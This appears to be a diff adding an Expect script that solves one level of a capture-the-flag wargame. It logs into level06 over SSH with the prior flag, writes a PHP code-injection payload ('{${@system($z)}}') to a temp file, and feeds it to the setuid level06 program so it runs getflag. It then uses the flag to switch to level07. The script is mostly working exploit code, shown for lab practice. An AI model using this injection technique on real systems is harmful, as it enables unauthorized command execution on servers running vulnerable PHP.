@@ -1,0 +1,27 @@
+#!/usr/bin/expect
+
+set ip [ lindex $argv 0 ]
+set port [ lindex $argv 1 ]
+set user [ lindex $argv 2 ]
+set password [ exec cat "../../flag05/flag" ]
+
+spawn ssh "$user\@$ip" "-p $port"
+
+expect "password:" { send "$password\r" }
+
+expect -re {\$ $}
+	send "ls -aRl\r"
+	send "cat level06.php\r"
+	send "echo '\[\x \{\${@system(\$z)}}]' > /tmp/scr\r"
+	send "chmod +x /tmp/scr\r"
+	send "./level06 /tmp/scr getflag\r"
+	send "su level07\r"
+
+set flag [ exec cat ../flag ]
+
+expect "Password:" { send "$flag\r" }
+
+expect -re {\$ $}
+	send "id\r"
+	send "exit\r"
+	send "exit\r"
